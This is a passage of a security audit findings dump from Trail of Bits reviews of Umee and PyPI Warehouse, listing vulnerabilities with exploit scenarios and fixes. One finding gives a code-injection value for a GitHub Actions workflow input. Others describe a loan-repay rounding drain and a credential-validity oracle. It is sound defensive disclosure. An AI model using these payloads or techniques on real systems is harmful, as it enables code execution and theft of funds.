remaining debt - less than he borrowed // we send 90000000, because it will be truncated to the actually owned amount repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 90000000 )) s.Require().NoError(err) s.Require().Equal(repaid.Int64(), 20000000 -(iters*payOneIter)-amountDelta) // verify lender's new loan amount in the correct denom (zero) loanBalance := s.app.LeverageKeeper.GetBorrow(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(loanBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 0 )) // we expect total supply to not change finalSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply, finalSupply) // verify lender's new umee balance // should be 10 - 1k from initial + 20 from loan - 20 repaid = 9000 umee // it is more -> borrower benefits tokenBalance := app.BankKeeper.GetBalance(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(tokenBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 9000000000 +amountDelta)) // in test, we didn't pay interest, so module balance should not have changed // but it did because of rounding moduleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) s.Require().NotEqual(moduleBalance, initialModuleBalance) s.Require().Equal(moduleBalance.Int64(), int64 ( 1000000000 -amountDelta)) } Figure 34.1: A test case demonstrating the rounding bug Exploit Scenario An attacker identies a high-value coin. He takes out a loan and repays it in a single transaction and then repeats the process again and again. By using a single transaction for both operations, he evades the borrowing fee (i.e., the interest scalar is not increased). Because of rounding errors in the systems calculations, he turns a prot by repaying less than he borrowed each time. His prots exceed the transaction fees, and he continues his attack until he has completely drained the module of its funds. Exploit Scenario 2 The Umee system has numerous users. Each user executes many transactions, so the system must perform many calculations. Each calculation with a rounding error causes it to lose a small amount of tokens, but eventually, the small losses add up and leave the system without the essential funds. Recommendations Short term, always use the rounding direction that will benet the module rather than the user. Long term, to ensure that users pay the necessary fees, consider prohibiting them from borrowing and repaying a loan in the same block. Additionally, use fuzz testing to ensure that it is not possible for users to secure free tokens. References  How to Become a Millionaire, 0.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "35. Outdated and vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Both Umee and Peggo rely on outdated and vulnerable dependencies. The table below lists the problematic packages used by Umee dependencies; the yellow rows indicate packages that were also detected in Peggo dependencies. We set the severity of this nding to undetermined because we could not conrm whether these vulnerabilities aect Umee or Peggo. However, they likely do not, since most of the CVEs are related to binaries or components that are not run in the Umee or Peggo code. Package Vulnerabilities golang/github.com/coreos/etc d@3.3.13 pkg:golang/github.com/dgrija lva/jwt-go@3.2.0 CVE-2020-15114 CVE-2020-15136 CVE-2020-15115 CVE-2020-26160 golang/github.com/microcosm- cc/bluemonday@1.0.4 #111 (CWE-79) golang/k8s.io/kubernetes@1.1 3.0 CVE-2020-8558, CVE-2019-11248, CVE-2019-11247, CVE-2019-11243, CVE-2021-25741, CVE-2019-9946, CVE-2020-8552, CVE-2019-11253, CVE-2020-8559, CVE-2021-25735, CVE-2019-11250, CVE-2019-11254, CVE-2019-11249, CVE-2019-11246, CVE-2019-1002100, CVE-2020-8555, CWE-601, CVE-2019-11251, CVE-2019-1002101, CVE-2020-8563, CVE-2020-8557, CVE-2019-11244 Recommendations Short term, update the outdated and vulnerable dependencies. Even if they do not currently aect Umee or Peggo, a change in the way they are used could introduce a bug. Long term, integrate a dependency-checking tool such as nancy into the CI/CD pipeline. Frequently update any direct dependencies, and ensure that any indirect dependencies in upstream libraries remain up to date. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "25. Insecure storage of price-feeder keyring passwords ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "26. Insu\u0000cient validation of genesis parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "A few system parameters must be set correctly for the system to function properly. The system checks the parameter input against minimum and maximum values (not always correctly) but does not check the correctness of the parameters dependencies. Exploit Scenario When preparing a protocol upgrade, the Umee team accidentally introduces an invalid value into the conguration le. As a result, the upgrade is deployed with an invalid or unexpected parameter. Recommendations Short term, implement proper validation of congurable values to ensure that the following expected invariants hold:  BaseBorrowRate <= KinkBorrowRate <= MaxBorrowRate  LiquidationIncentive <= some maximum  CompleteLiquidationThreshold > 0 (The third invariant is meant to prevent division by zero in the Interpolate method.)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "31. Lack of prioritization of Peggo orchestrator messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Peggo orchestrator broadcasts Ethereum events as Cosmos messages and sends them in batches of 10 ( at least by default ). According to a code comment (gure 32.1), if the execution of a single message fails on the Umee side, all of the other messages in the batch will also be ignored. We set the severity of this nding to undetermined because it is unclear whether it is exploitable. // runTx processes a transaction within a given execution mode, encoded transaction // bytes, and the decoded transaction itself. All state transitions occur through // a cached Context depending on the mode provided. State only gets persisted // if all messages get executed successfully and the execution mode is DeliverTx. // Note, gas execution info is always returned. A reference to a Result is // returned if the tx does not run out of gas and if all the messages are valid // and execute successfully. An error is returned otherwise. func (app *BaseApp) runTx(mode runTxMode, txBytes [] byte , tx sdk.Tx) (gInfo sdk.GasInfo, result *sdk.Result, err error ) { Figure 32.1: cosmos-sdk/v0.45.1/baseapp/baseapp.go#L568-L575 Recommendations Short term, review the practice of ignoring an entire batch of Peggo-broadcast Ethereum events when the execution of one of them fails on the Umee side, and ensure that it does not create a denial-of-service risk. Alternatively, change the system such that it can identify any messages that will fail and exclude them from the batch. Long term, generate random messages corresponding to Ethereum events and use them in testing to check the systems handling of failed messages.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "1. Unsafe input handling in Combine PRs workow ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Unsanitized user input is directly interpolated into code snippets in the combine pull requests Github Actions workow, which can allow an attacker with enough permissions to execute this workow to perform arbitrary code execution in the context of the workow job. These workows use the ${{  }} notation to insert user input into small JavaScript programs. This approach performs no validation of the data, and the value interpolation is performed before the program execution, which means that specially crafted input can change the code being executed. For instance, in gure 1.1, the ignoreLabel input is interpolated as part of a string. An attacker may execute arbitrary code by providing a specially crafted string in ignoreLabel , as shown in the exploit scenario. const searchString = `repo: ${ context.repo.owner } / ${ context.repo.repo } is:pr is:open label:dependencies label:python -label: ${ { github.event.inputs.ignoreLabel } } ` ; Figure 1.1: The ignoreLabel input is injected as part of a string ( warehouse/.github/workflows/combine-prs.yml#47 ) A similar issue exists in the code shown in gure 1.2, as combineBranchName is also interpolated unsafely. await github.rest.actions.createWorkflowDispatch({ owner: context.repo.owner, repo: context.repo.repo, workflow_id: workflow_id, ref: ' ${{ github.event.inputs.combineBranchName }} ' }); Figure 1.2: The combineBranchName input is injected as part of a string ( warehouse/.github/workflows/combine-prs.yml#181186 ) Both of these scripts are run with a GitHub token with write permissions over the repository, pull requests, and actions. An attacker may use these non-default permissions to their advantage. permissions : contents : write pull-requests : write actions : write Figure 1.3: Combine PRs workow permissions ( warehouse/.github/workflows/combine-prs.yml#2528 ) This issue is informational, as this workow can only be triggered manually via workflow_dispatch , which in turn requires users to be a repository collaborator with write access . Exploit Scenario An attacker with permissions to trigger an execution of the Combine PRs workow runs it with ignoreLabel set to `+(function(){console.log(`hack`);return``;})()+` . Their code gets executed as part of the workow. Recommendations Short term, replace value interpolation in code with a safer alternative, such as environment variables in an env: block, and their corresponding access through process.env.VARIABLE in JavaScript. Long term, review the GitHub Actions documentation and be aware of best practices and common issues. Consider all user input as unsafe, and do not interpolate it in code or scripts. References  Keeping your GitHub Actions and workows secure Part 2: Untrusted input , from the GitHub Security Lab", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Weak signatures used in AWS SNS verication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse has an endpoint for AWS SNS webhooks, which it uses to listen for messages related to Warehouses use of AWS SES for emails. To prevent impersonation or malicious modication, AWS SNS includes a digital signature in each payload, along with a URL that points to a public-key bearing certicate that can be used to verify the signature. Warehouse correctly veries the digital signature and ensures that the certicate URL is on a trusted domain, but does so using PKCS#1v1.5 with SHA-1, which is known to be vulnerable to certicate forgery. try : pubkey.verify(signature, data, PKCS1v15(), SHA1()) except _InvalidSignature: raise InvalidMessageError( \"Invalid Signature\" ) from None Figure 2.1: PKCS#1v1.5 with SHA-1 signature verication of SNS payloads ( warehouse/warehouse/utils/sns.py#6972 ) Exploit Scenario The integrity of the PKCS#1v1.5 signing scheme depends entirely on the collision resistance of the underlying cryptographic digest used. SHA-1 has been vulnerable to practical collision attacks for several years ; an attacker with moderate computational resources could leverage these attacks to produce an illegitimate signature that would be veried by the public key presented in the AWS SNS scheme. This, in turn, would allow an attacker to inauthentically control Warehouses SNS topic subscriptions, as well as le false bounce/complaint notices against email addresses. We currently characterize the diculty of this attack as undetermined, pending further investigation into AWS SNSs key rotation practices. A suciently rapid key rotation policy would likely make certicate forgery impractical, but relies on an external party (AWS) to maintain an appropriate rotation cadence in the face of increasingly performant SHA-1 collision techniques. Recommendations PyPI should congure its SNS Topic Attributes to avoid PKCS#1v1.5 with SHA-1. In particular, AWS SNS supports PKCS#1v1.5 with SHA256 instead which, while still not ideal, is still considered secure for digital signatures due to SHA256s collision resistance.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Undetermined"]}, {"title": "3. Vulnerable dependencies in Cabotage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "We performed an audit of Cabotages dependencies (as listed in requirements.txt ) and discovered multiple dependencies with publicly disclosed vulnerabilities, including dependencies used for cryptographic and PKI operations: Name Version ID Fix Versions certifi 2022.12.7 PYSEC-2023-135 2023.7.22 cryptography 39.0.1 PYSEC-2023-112 41.0.2 cryptography 39.0.1 GHSA-5cpq-8wj7-hf2v 41.0.0 cryptography 39.0.1 GHSA-jm77-qphf-c4w8 41.0.3 flask 2.2.2 PYSEC-2023-62 2.2.5,2.3.2 flask-security 3.0.0 GHSA-cg8c-gc2j-2wf7 requests 2.25.1 PYSEC-2023-74 2.31.0 werkzeug 2.2.2 PYSEC-2023-58 2.2.3 werkzeug 2.2.2 PYSEC-2023-57 2.2. Exploit Scenario The vulnerabilities above are publicly known, and Cabotage is an open-source repository; an attacker may inspect each to determine its applicability to Cabotage. We currently characterize the severity of this attack as undetermined, pending a more in-depth analysis of each dependencys vulnerabilities. Depending on severity and relevance, each vulnerability may receive a discrete exploit scenario. Recommendations Short term, upgrade each dependency to a non-vulnerable version, where possible. If no non-vulnerable version exists, either conrm that the vulnerability is not relevant to Cabotages use of the dependency or , if relevant, patch or replace the dependency. Long term, perform automatic dependency auditing within the Cabotage codebase. This can be done either with Dependabot (including automatic x PRs for security issues) or with pip-audit and gh-action-pip-audit .", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "4. Lack of rate limiting on endpoints that send email ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse sends notication emails when sensitive actions are performed by users. The following routes can trigger these emails and are not subject to rate limits:  manage.account  manage.account.totp-provision  manage.account.webauthn-provision  manage.account.recovery-codes.regenerate  manage.project.release  manage.project.roles  manage.project.change_role Warehouses @_email decorator does include a rate-limiting mechanism that prevents a single email from being sent too many times; however, it is disabled by default. Warehouse additionally imposes a rate limit on actions that send emails to unveried addresses (such as adding a new unveried address to an account via manage.account ), meaning that some email-sending operations through manage.account are implicitly rate limited. Despite an overall lack of rate limiting on these endpoints, other factors make their use as spam vectors dicult: all require either a veried email address, or require that the victim accept an invitation to an attacker-controlled project. Additionally, none of the emails produced have substantial user-controllable components, other than usernames, project names, and other heavily normalized and escaped elds. Consequently, while an attacker may nd ways to harm PyPIs spam score in these elds, they are not able to inject entirely controlled content into the non-rate-limited emails in question. Exploit Scenario An attacker repeatedly performs a sensitive action. Since there are no rate limiters in place on the endpoints in question, the attacker is able to trigger an unbounded number of notication emails to the attackers own address with Warehouse infrastructure. In some cases, the attacker may also be able to trigger notications to other Warehouse users. This may have a negative impact on PyPIs spam score, and drive up service costs. Recommendations Short term, ensure that these notication emails are rate limited through the API request, with a per-user cross-request rate limit mechanism, or through the existing email rate-limiting mechanism.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Account status information leak for frozen and disabled accounts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "As part of determining whether to accept a basic authentication ow, Warehouse checks whether the supplied user identity is currently marked as disabled (including being frozen directly by the admins, or disabled due to a compromised password, etc.): if userid is not None : user = login_service.get_user(userid) is_disabled, disabled_for = login_service.is_disabled(user.id) if is_disabled: # Comment excerpted. if disabled_for == DisableReason.CompromisedPassword: raise _format_exc_status( BasicAuthBreachedPassword(), breach_service.failure_message_plain ) elif disabled_for == DisableReason.AccountFrozen: raise _format_exc_status(BasicAuthAccountFrozen(), \"Account is frozen.\" ) else : raise _format_exc_status(HTTPUnauthorized(), \"Account is disabled.\" ) elif login_service.check_password( Figure 5.1: Checking whether the account is disabled during basic auth ( warehouse/warehouse/accounts/security_policy.py#5978 ) Critically, this check happens before the users password is checked, and results in a distinct error message returned to the requesting client without any subsequent check. As a result, an attacker who knows a targets PyPI username can determine their targets account status on PyPI without knowing their password or any other information. This information is not exposed publicly anywhere else on PyPI, making it a potentially useful source of reconnaissance information. Uploading distributions to http://localhost/legacy/ Uploading fakepkg-0.0.2.tar.gz 100%  3.9/3.9 kB  00:00  ? WARNING Error during upload. Retry with the --verbose option for more details. ERROR HTTPError: 401 Unauthorized from http://localhost/legacy/ Account is frozen. Figure 5.2: Example error message produced to authenticating client, even with an invalid password. Exploit Scenario An attacker has access to stolen credentials for PyPI accounts, and wishes to quickly test their validity without loss of stealth. They use the upload endpoint (or any other endpoint that accepts basic authentication) to check which accounts have already been disabled. Separately, the attacker may be able to selectively disclose potential credentials, using an accounts subsequent disablement as an oracle for the overall validity of their stolen credentials (much like a stolen credit card testing service). Recommendations We recommend that the checks performed in _basic_auth_check always include a check against login_service.check_password before returning distinct error messages to the authenticating client. If the users password cannot be checked when disabled for technical reasons, we recommend returning a context-free error to avoid an information leak here.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Potential race conditions in search locking ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse uses Elasticsearch for its search back end, and uses Redis to synchronize stateful tasks dispatched to the search back end (such as reindexing and un-indexing of projects). This synchronization is done with a redis-py Lock object, wrapped into a custom SearchLock context manager: class SearchLock : def __init__ ( self , redis_client, timeout= None , blocking_timeout= None ): self .lock = redis_client.lock( \"search-index\" , timeout=timeout, blocking_timeout=blocking_timeout ) def __enter__ ( self ): if self .lock.acquire(): return self else : raise redis.exceptions.LockError( \"Could not acquire lock!\" ) def __exit__ ( self , type , value, tb): self .lock.release() Figure 6.1: The SearchLock context manager ( warehouse/warehouse/search/tasks.py#102115 ) SearchLock accepts a timeout parameter, which is used within the interior Redis lock to auto-expire the lock if the timeout is exceeded. However, this timeout is not handled in SearchLock s __enter__ or __exit__ , meaning that the underlying lock can expire while appearing to still be held by whatever Python code is executing the context manager. Exploit Scenario An attacker leverages the uncontrolled lock release to trigger a reindex , reindex_project , or unindex_project task opportunely, resulting in either stale or misleading information in the search index (and consequently in search results returned to PyPI users). Given the length of timeouts allowed by current SearchLock users (between 15 seconds and 30 minutes), we consider this attack dicult. Recommendations We recommend that SearchLock be refactored or rewritten to handle the possibility of an interior timeout. In particular, redis-pys Lock class is itself a context manager, so SearchLock could be rewritten as a wrapper context manager without any specic timeout handling needed (since it will be performed correctly by Lock s own interior context manager).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Use of multiple distinct URL parsers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse makes direct use of at least three separate URL parser implementations: The Python standard librarys urllib.parse implementation; The rfc3986 package;    urllib3 s implementation, via uses of requests . These implementations are occasionally composed, such as in SNS signing certicate retrieval: cert_url_p = urllib.parse.urlparse(cert_url) cert_scheme = cert_url_p.scheme cert_host = cert_url_p.netloc if cert_scheme != \"https\" : raise InvalidMessageError( \"Invalid scheme for SigningCertURL\" ) if _signing_url_host_re.fullmatch(cert_host) is None : raise InvalidMessageError( \"Invalid location for SigningCertURL\" ) Figure 7.1: urlparse for domain checking, followed by use in requests ( warehouse/warehouse/utils/sns.py#7783 ) URLs are specied in conicting RFCs and non-RFC standards, and real-world URL parsers frequently exhibit confusion vulnerabilities . When composed together, parsers that disagree on a URLs contents can produce exploitable open redirects, requests to unintended domains or paths, and similar behavior. Exploit Scenario An attacker who discovers domain confusion in urlparse may be able to induce an open redirect through Warehouse via the Referer header, due to Warehouses use of urlparse in is_safe_url : def is_safe_url (url, host= None ): if url is not None : url = url.strip() if not url: return False # Chrome treats \\ completely as / url = url.replace( \"\\\\\" , \"/\" ) # Chrome considers any URL with more than two slashes to be absolute, but # urlparse is not so flexible. Treat any url with three slashes as unsafe. if url.startswith( \"///\" ): return False url_info = urlparse(url) # Forbid URLs like http:///example.com - with a scheme, but without a # hostname. # In that URL, example.com is not the hostname but, a path component. # However, Chrome will still consider example.com to be the hostname, # so we must not allow this syntax. if not url_info.netloc and url_info.scheme: return False # Forbid URLs that start with control characters. Some browsers (like # Chrome) ignore quite a few control characters at the start of a # URL and might consider the URL as scheme relative. if unicodedata.category(url[ 0 ])[ 0 ] == \"C\" : return False return ( not url_info.netloc or url_info.netloc == host) and ( not url_info.scheme or url_info.scheme in { \"http\" , \"https\" } ) Figure 7.2: urlparse in is_safe_url (excerpted from warehouse/warehouse/utils/http.py#2253 ) Separately, an attacker who discovers a parser between two or more of Warehouses URL parsers may be able to spoof SNS messages (due to the use of a URL for SNS certicate retrieval), manipulate renderings of URLs on public pages, or perform other unintended transformations on trusted data. Recommendations Short term, we recommend that Warehouse conduct a review of its URL parsing behavior, including identifying all sites where urlparse and similar APIs are used, to ensure that, in particular, domain and path confusion cannot occur. Long term, we recommend that Warehouse reduce the number of URL parsers that it directly and indirectly depends on. In particular, given that rfc3986 and urllib3 are already dependencies, we recommend standardizing on eithers parsing and validation routines and replacing all uses of urllib.parse.urlparse outright.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "8. Overly permissive CSP headers on XML views ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouses ordinary Content Security Policy is overridden on a handful of XML-only views, including the views responsible for PyPIs RSS feeds and sitemaps: def sitemap_index (request): request.response.content_type = \"text/xml\" request.find_service(name= \"csp\" ).merge(XML_CSP) Figure 8.1: CSP customization on a sitemap view ( warehouse/warehouse/sitemap/views.py#4750 ) The contents of XML_CSP is a single unsafe-inline rule for style-src , meaning that XML views allow arbitrary inline styles to be loaded. Exploit Scenario This nding is purely informational; all aected views are primarily static and generated from escaped data, minimizing the risk of stylesheet injection. Recommendations We recommend that Warehouse remove XML_CSP entirely and avoid special-casing the CSP on XML views.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Missing Permissions-Policy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse currently serves a variety of best-practice HTTP headers, including CSP headers, X-Content-Type-Options , and Strict-Transport-Security . Its current headers notably do not include Permissions-Policy , which is a W3C standard for browser feature control. Serving a Permissions-Policy in the response headers gives websites an additional defense in depth against XSS, compromised CDNs, and other vectors through which an attacker may be able to run arbitrary JavaScript on the websites trusted origins. Exploit Scenario An attacker with a separate JavaScript injection vector (such as stored XSS or a CDN compromise) runs arbitrary JavaScript code on PyPIs trusted origins, including JavaScript that makes use of browser feature APIs such as the microphone, camera, geolocation service, payments API, and so forth. Depending on the victims browser, they may or may not receive a prompt for any or all of these feature requests; given PyPIs status as a high-trust domain, they may accept such feature requests without fully evaluating them. A Permissions-Policy is purely a defense in depth; as a result, we consider its diculty high in the absence of a known JavaScript injection vector. Recommendations We recommend that Warehouse evaluate and deploy a Permissions-Policy header that exposes only Warehouses own (minimal) browser feature requirements while forbidding access to all other browser features. A potential Permissions-Policy is supplied below. Permissions-Poicy: publickey-credentials-create=(self), publickey-credentials-get=(self), accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=(), gamepad=(), geolocation=(), gyroscope=(), hid=(), identity-credentials-get=(), idle-detection=(), local-fonts=(), magnetometer=(), microphone=(), midi=(), otp-credentials=(), payment=(), picture-in-picture=(), screen-wake-lock=(), serial=(), speaker-selection=(), storage-access=(), usb=(), web-share=(), xr-spatial-tracking=(); Figure 9.1: A potential Permissions-Policy for Warehouse", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. Domain separation in le digests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouses File model (corresponding to a release distribution) contains an md5_digest column with a unique constraint, representing the distributions MD5 hash: md5_digest = mapped_column(Text, unique= True , nullable= False ) Figure 10.1: File.md5_digest denition ( warehouse/warehouse/packaging/models.py#670 ) MD5 is considered an insecure cryptographic digest with well-known and practical (from consumer hardware) collision attacks. This MD5 hash is subsequently used to determine whether a le being uploaded has already been uploaded: def _is_duplicate_file (db_session, filename, hashes): \"\"\" Check to see if file already exists, and if it's content matches. A file is considered to exist if its filename *or* blake2 digest are present in a file row in the database. Returns: - True: This file is a duplicate and all further processing should halt. - False: This file exists, but it is not a duplicate. - None: This file does not exist. \"\"\" file_ = ( db_session.query(File) .filter( (File.filename == filename) | (File.blake2_256_digest == hashes[ \"blake2_256\" ]) ) .first() ) if file_ is not None : return ( file_.filename == filename and file_.sha256_digest == hashes[ \"sha256\" ] and file_.md5_digest == hashes[ \"md5\" ] and file_.blake2_256_digest == hashes[ \"blake2_256\" ] ) return None Figure 10.2: File deduplication logic on uploads ( warehouse/warehouse/forklift/legacy.py#752781 ) Notably, the logic above returns None if an uploaded le does not have a matching lename or Blake2 hash, even if that le has a matching MD5 hash. This signals to the caller that the le does not exist and allows Warehouses upload logic to continue to the File creation step, which subsequently fails due to the unique constraint on File.md5_digest . Exploit Scenario An attacker contrives large numbers of distinct release distributions with colliding MD5 digests and repeatedly uploads them to PyPI, causing database pressure in the form of constraint violations and large volumes of rollbacks (due to the late stage at which the violation occurs here). We currently consider the impact of this scenario low, as the unique constraint prevents any distributions with colliding MD5 digests from entering further into Warehouse. However, we note that an attacker who manages to bypass this constraint may be able to leverage TOB-PYPI-11 and TOB-PYPI-14 to induce further confusion between legitimate and attacker-controlled les, including for downstream consumers of PyPI. Recommendations Short term, we recommend that Warehouse check for domain separation between its supported hashes, and reject any le exhibiting separation (i.e., any le for which some cryptographic digests compare equals but others do not). This should always be sound (in terms of not rejecting legitimate uploads), since MD5 is still a diuse compression function with an extremely low likelihood of accidental collisions. Long term, we recommend that Warehouse remove File.md5_digest and all associated machinery entirely, and limit its use of digests for le deduplication to collision-resistant ones (such as the already present SHA256 and Blake2 digests). We recommend that Warehouse retain any domain separation checks even if it does not store MD5 digests, due to TOB-PYPI-14 .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. Object storage susceptible to TOC/TOU due to temporary les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse makes use of temporary les in a variety of places, both through Pythons NamedTemporaryFile API and through a xed lename placed within a temporary directory created by the TemporaryDirectory API. The upload endpoint uses one such le: with tempfile.TemporaryDirectory() as tmpdir: temporary_filename = os.path.join(tmpdir, filename) # Buffer the entire file onto disk, checking the hash of the file as we # go along. with open (temporary_filename, \"wb\" ) as fp: ... Figure 11.1: Use of a named temporary le for response buering ( warehouse/warehouse/forklift/legacy.py#12321237 ) Warehouses primary reason for using named temporary les appears to be to satisfy other API designs, such as the IGenericFileStorage interfaces use of le paths: class IGenericFileStorage (Interface): ... def store (path, file_path, *, meta= None ): \"\"\" Save the file located at file_path to the file storage at the location specified by path. An additional meta keyword argument may contain extra information that an implementation may or may not store. \"\"\" Figure 11.2: The IGenericFileStorage.store interface ( warehouse/warehouse/packaging/interfaces.py#2152 ) Warehouses use of named temporary les conforms to best practices: full temporary paths are not predictable, and paths are opened at the same time as creation to prevent trivial TOC/TOU-style attacks . At the same time, any use of named temporary les without transfer of a synchronized handle or le descriptor is susceptible to TOC/TOU: an attacker with the ability to monitor these directories or otherwise determine the exact path given to store may be able to rewrite that paths contents after validation but before storage, resulting in an inconsistent and potentially exploitable split state between the PyPI database and the artifacts being served to clients. Exploit Scenario As mentioned above, an attacker with the ability to monitor temporary les or otherwise determine the paths passed into a particular IGenericFileStorage.store implementation may be able to rewrite the content at that path after Warehouse has already validated and produced a digest for it, resulting in a split state between the database and the object store. The exploitability of this state depends on the stores own integrity guarantees, as well as whether downstream clients perform digest checks on their distribution downloads. This nding is purely informational; an attacker with the ability to monitor temporary le directories and mount this attack is likely to have other lateral and horizontal capabilities. This nding and associated recommendations are presented as part of a defense-in-depth strategy. However, we note that an attacker who manages to exploit this may be able to additionally leverage TOB-PYPI-10 and TOB-PYPI-14 to further induce potentially exploitable confusion in PyPI and its downstream users. Recommendations We recommend that the IGenericFileStorage.store interface (and all implementers) be refactored to take one of the following input forms, rather than a named le path: 1. 2. An in-memory buer (such as a bytes or memoryview ); An open le handle or descriptor (such as a le-like object); Option (1) will entirely mitigate the TOC/TOU, at the cost of potentially unacceptable memory usage. Option (2) will either partially or entirely mitigate the TOC/TOU, depending on the callers context: contexts where the le-like object is derivable entirely from the underlying HTTP request (like release le upload) will be entirely mitigated, while contexts where the le-like object is still held from a temporary le may still be manipulable depending on the 